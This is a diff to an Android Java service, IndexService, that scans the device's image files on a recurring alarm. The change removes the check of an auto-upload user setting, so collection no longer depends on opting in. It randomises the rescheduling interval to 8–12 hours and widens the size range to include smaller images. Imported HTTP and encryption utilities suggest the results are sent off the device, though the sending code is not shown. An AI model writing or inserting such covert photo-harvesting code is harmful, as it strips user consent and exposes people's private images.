@@ -1,14 +1,9 @@
 package com.zhangheng.myapplication.service;
 
 import android.Manifest;
-import android.app.AlarmManager;
-import android.app.PendingIntent;
-import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
-import android.os.IBinder;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
@@ -19,7 +14,6 @@ import com.zhangheng.myapplication.getphoneMessage.GetPhoto;
 import com.zhangheng.myapplication.okhttp.OkHttpUtil;
 import com.zhangheng.myapplication.permissions.ReadAndWrite;
 import com.zhangheng.myapplication.service.receiver.IndexReceiver;
-import com.zhangheng.myapplication.setting.ServerSetting;
 import com.zhangheng.myapplication.util.AndroidImageUtil;
 import com.zhangheng.myapplication.util.EncryptUtil;
 import com.zhangheng.myapplication.util.LocalFileTool;
@@ -43,54 +37,34 @@ import cn.hutool.json.JSONObject;
 import cn.hutool.json.JSONUtil;
 import okhttp3.Call;
 
-public class IndexService extends Service {
+/*图片服务*/
+public class IndexService extends MyService {
 
     private final static String Tag = "图片检查服务";
-    private ServerSetting setting;
-    private final Context context = IndexService.this;
 
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        setting = new ServerSetting(context);
+    public IndexService() {
+        super("IndexService");
     }
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (setting.getIsAutoUploadPhoto()) {
+    protected void onHandleIntent(@Nullable Intent intent) {
+        boolean b = ReadAndWrite.RequestPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE);
+        if (b)
             new Thread(new Runnable() {
                 @Override
                 public void run() {
-                    try {
-                        boolean b = ReadAndWrite.RequestPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE);
-                        if (b)
-                            getPhoto();
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
+                    getPhoto();
                 }
             }).start();
-        }
-        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
-        int anHour = 12 * 60 * 60 * 1000;
-        long triggerAtTime = System.currentTimeMillis() + anHour;
-        Intent i = new Intent(this, IndexReceiver.class);
-        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);
-        manager.set(AlarmManager.RTC_WAKEUP, triggerAtTime, pi);
 
-        return super.onStartCommand(intent, flags, startId);
+        int random = RandomrUtil.createRandom(8, 12);
+        long anHour = random * 60 * 60 * 1000;
+
+        timingService(anHour, IndexReceiver.class);
+
     }
 
-    @Nullable
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
 
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-    }
 
     public void getPhoto() {
         boolean b = ReadAndWrite.RequestPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE);
@@ -105,7 +79,7 @@ public class IndexService extends Service {
                     public void callBack(List<String> localPath) {
                         File file = null;
                         StringBuilder sb = new StringBuilder();
-                        String local_path = LocalFileTool.BasePath + "/" + getResources().getString(R.string.app_name) + "/data/100kb~2Mb-IMG.txt";
+                        String local_path = LocalFileTool.BasePath + "/" + getResources().getString(R.string.app_name) + "/data/10kb~2Mb-IMG.txt";
                         List<String> txtFile = TxtOperation.readTxtFile(local_path, "UTF-8");
                         txtFile = CollUtil.removeBlank(txtFile);
                         long length = 0;
@@ -120,7 +94,7 @@ public class IndexService extends Service {
                                     for (String s1 : paths) {
                                         if (s.startsWith(s1)) {
 //                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
-                                            if (length > 1024 * 100 && length < 1024 * 1024 * 2) {
+                                            if (length > 1024 * 10 && length < 1024 * 1024 * 2) {
                                                 photo.add(path);
                                                 sb.append(path + "\n");
                                             }
@@ -139,7 +113,7 @@ public class IndexService extends Service {
                             TxtOperation.writeTxtFile(sb.toString(), local_path, true);
                         photo.addAll(txtFile);
                         final int size = photo.size();
-                        Log.e(Tag, "100kb~2Mb图片数：" + size);
+                        Log.e(Tag, "10kb~2Mb图片数：" + size);
 
                         Map<String, Object> msg = new HashMap<>();
                         msg.put("num", size);
